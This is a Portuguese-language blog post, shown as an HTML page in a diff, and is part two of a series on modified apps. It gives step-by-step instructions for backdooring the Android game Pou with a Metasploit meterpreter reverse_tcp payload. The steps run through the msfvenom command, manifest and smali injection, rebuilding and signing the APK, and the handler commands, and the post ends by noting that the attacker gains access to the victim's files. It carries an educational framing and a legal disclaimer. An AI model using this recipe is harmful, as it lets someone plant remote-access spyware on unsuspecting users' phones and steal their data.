@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="pt-br">
+	<head>
+		
+<title>Já usou algum aplicativo modificado? (parte 2) - Anderson Gomes</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" type="image/x-icon" href="/assets/favicons/favicon.ico">
+
+<link rel="stylesheet" href="/assets/bulma/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="/assets/fontawesome-free-6.5.1-web/css/all.css">
+
+
+<link rel="stylesheet" href="/assets/css/main.css">
+
+
+
+<meta name="keywords" content="1,2,3,">
+<meta name="description" content="Segunda parte do artigo, como criar um aplicativo modificado para fins de estudo.">
+
+
+	<meta name="generator" content="Hexo 7.0.0"></head>
+	<body>
+		<div id="home-hidden"></div>
+		<nav class="navbar is-fixed-top has-text-centered" role="navigation" aria-label="main navigation" style="background-color: #19193b;">
+	<div class="container">
+		<div class="navbar-brand">
+			<a class="navbar-item logo" target="_blank" rel="noopener" href="https://andersongomes.dev.br">
+				<img src="/assets/images/logo_anderson.png" width="112" height="28">
+			</a>
+			<a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false"
+				data-target="navbarBasicExample">
+				<span aria-hidden="true"></span>
+				<span aria-hidden="true"></span>
+				<span aria-hidden="true"></span>
+			</a>
+		</div>
+
+		<div id="navbarBasicExample" class="navbar-menu">
+			<div class="navbar-start">
+				
+					</for>
+					<a class="navbar-item navbar-item-hover" href="/">
+						HOME
+					</a>
+					
+					</for>
+					<a class="navbar-item navbar-item-hover" href="/about">
+						ABOUT
+					</a>
+					
+			</div>
+
+			<div class="navbar-end">
+				<div class="navbar-item">
+					<div class="buttons">
+						<a class="button navbar-item-social" target="_blank" rel="noopener" href="https://www.youtube.com/@andersonDev_">
+							<i class="fa-brands fa-youtube fa-2xl"></i>
+						</a>
+						<a class="button navbar-item-social" target="_blank" rel="noopener" href="https://www.linkedin.com/in/devanderson">
+							<i class="fa-brands fa-linkedin fa-2xl"></i>
+						</a>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</nav> 
+
+<div class="container container-100vh">
+  <div class="columns">
+    <div class="column is-8 is-offset-2 has-text-centered">
+      <!--figure class="image is-16by9"-->
+      <figure class="image">
+        <img src="https://cdn-images-1.medium.com/max/800/1*nQw9NwHbf-3lW2fB3Y5zyg.png" alt="">
+        <figcaption></figcaption>
+      </figure>
+    </div>
+  </div>
+  <section class="articles">
+    <div class="column is-8 is-offset-2">
+      <div class="card article background-color-principal">
+        <div class="card-content">
+          <div class="media">
+            <div class="media-content has-text-centered">
+              <p class="title article-title">Já usou algum aplicativo modificado? (parte 2)</p>
+              <p class="subtitle is-4 article-subtitle is-pulled-left">
+                Escrito por Anderson Gomes em 25/02/2020
+              </p>
+              
+              <!--div class="control"><span class="tag is-info is-uppercase">story</span></div-->
+            </div>
+          </div>
+          <div class="content article-body"><h1 id="Ja-usou-algum-aplicativo-modificado-parte-2"><a href="#Ja-usou-algum-aplicativo-modificado-parte-2" class="headerlink" title="Já usou algum aplicativo modificado? (parte 2)"></a>Já usou algum aplicativo modificado? (parte 2)</h1><p>Você pode esta sendo espionado 😂.</p>
+<hr>
+<h3 id="Ja-usou-algum-aplicativo-modificado-parte-2-1"><a href="#Ja-usou-algum-aplicativo-modificado-parte-2-1" class="headerlink" title="Já usou algum aplicativo modificado? (parte 2)"></a>Já usou algum aplicativo modificado? (parte 2)</h3><p>Você pode esta sendo espionado 😂.</p>
+<p>Nesta segunda parte irei colocar um backdoor no jogo que modificamos no último <a target="_blank" rel="noopener" href="https://medium.com/@andersongomes001/j%C3%A1-usou-algum-aplicativo-modificado-7771a390288a">post</a>.</p>
+<p>Primeiro vamos criar um payload para android com o “msfvenom”, vai abrindo aquela máquina virtual com kali que você não usa já faz um tempo.</p>
+<p>O comando é o seguinte.</p>
+<blockquote>
+<p>msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.6 LPORT&#x3D;9090 R &gt; payload.apk</p>
+</blockquote>
+<p>Apenas troque o “192.168.1.6” pelo ip do seu servidor e “9090” pela porta que será aberta nele.</p>
+<p>Depois de gerar o apk precisamos descompilar e pegar o que precisamos e colocar no jogo.</p>
+<blockquote>
+<p><em>java -jar apktool_2.4.1.jar d</em> payload.apk</p>
+</blockquote>
+<p>Depois de descompilar devemos ir no arquivo “AndroidManifest.xml” e copiar as permissões “uses-permission” e as características “uses-feature” para o “AndroidManifest.xml” do jogo lembrando de eliminar as linhas duplicadas.</p>
+<p>No final vai ficar parecido com a imagem abaixo.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*nQw9NwHbf-3lW2fB3Y5zyg.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Precisamos copiar mais alguma coisas para o payload funcionar no jogo.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*HgkUz3oSxlXitccyzsyxHQ.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Copie o “intent-filter” para a activity que tiver “android.intent.action.MAIN” com certeza ela sera a classe principal, e o “receiver” e “service” podem colocar logo abaixo dela.</p>
+<p>Agora mude <strong>“.MainBroadcastReceiver”</strong> para <strong>“com.metasploit.stage.MainBroadcastReceiver”</strong> e <strong>“.MainService”</strong> para <strong>“com.metasploit.stage.MainService”.</strong></p>
+<p>No final de tudo isso o arquivo “AndroidManifest.xml” do jogo ficara parecido com este.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*LGKdV6wvrDLI1atuMZbYlw.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Dentro do payload vamos até a classe “MainActivity.smali” e copie a seguinte linha.</p>
+<blockquote>
+<p>invoke-static {p0}, Lcom&#x2F;metasploit&#x2F;stage&#x2F;MainService;-&gt;startService(Landroid&#x2F;content&#x2F;Context;)V</p>
+</blockquote>
+<p>Lembra lá no primeiro post que precisávamos saber qual era a classe que iniciava o jogo? Ela vai servir agora.</p>
+<p>Dentro da classe “App.smali” no jogo, procure pelo método “onCreate” e logo apos a chamada da superclasse devemos colar a linha copiada do payload, ficara parecida com a imagem abaixo.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*3WImqjXD-0p0MALJK2qMUg.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>O próximo passo é copiar as classes necessitarias para o payload funcionar, vá ate a pasta “payload\smali\com” copie a pasta “metasploit” para “pou\smali\com” feito isso é só compilar e assinar o apk.</p>
+<blockquote>
+<p>java -jar apktool_2.4.1.jar b pou -o pou_mod.apk</p>
+</blockquote>
+<blockquote>
+<p>java -jar uber-apk-signer-1.1.0.jar -a pou_mod.apk</p>
+</blockquote>
+<p>Antes de instalar o apk vamos iniciar o handler no kali com o comando abaixo.</p>
+<blockquote>
+<p><em>msfconsole<br>use exploit&#x2F;multi&#x2F;handler<br>set payload android&#x2F;meterpreter&#x2F;reverse_tcp<br>set LHOST 192.168.1.6<br>set LPORT 9090<br>exploit</em></p>
+</blockquote>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*fU48oND3KugaYtEC0a7beQ.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Agora é só instalar o app e quando for iniciado ganhamos acesso ao dispositivo.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*fXM5lJhnRW8Qdvtlfqjbyw.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Depois de ganhar o acesso você pode baixar imagens, arquivos, criar novos arquivos etc.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*F41qJWShqkIPZiV-nMXRWw.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Digitando <strong>help</strong> o “meterpreter” mostra uma lista de comando possíveis para serem executados no android.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*AGxzXgR1M0WCpwtttdoEdQ.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>E ai ainda vai instalar algum aplicativo modificado que você encontrar na internet?</p>
+<p>O conteúdo que disponibilizei foi para fins educativos, e saiba que invadir ou instalar programa para acessar remotamente um dispositivo, bem como clonar, para obter informações do outro, poderá incorrer no crime previsto no art. 154-A do Código Penal.</p>
+</div>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
+<div class="container">
+  <nav class="pagination is-centered" role="navigation" aria-label="pagination">
+    <div class="column is-6 is-offset-3">
+       
+      <a
+        class="button bd-fat-button is-info is-light bd-pagination-prev artigo-button"
+        href="/2020/02/25/Ja-usou-algum-aplicativo-modificado/"
+        title="Próximo Artigo"
+      >
+        <strong>Próximo Artigo <i class="fa fa-arrow-right"></i></strong>
+      </a>
+      
+    </div>
+  </nav>
+</div>
+
+<!--% partial('_partial/post_paging') %-->
+
+		<a id="toTop" class="button" style="display: block;" href="#home-hidden">
+  <span class="icon is-large">
+      <i class="fas fa-arrow-up"></i>
+  </span>
+</a>
+
+<footer class="section footer_section">
+  <div class="container">
+    <div class="content has-text-centered">
+      <p>
+        <strong
+          >© 2023-2024 Desenvolvido por
+          <a target="_blank" rel="noopener" href="https://andersongomes.dev.br">Anderson Gomes</a>.</strong
+        >
+      </p>
+    </div>
+  </div>
+</footer>
+
+<script src="/assets/js/bulma.js"></script>
+
+
+	</body>
+</html>
+
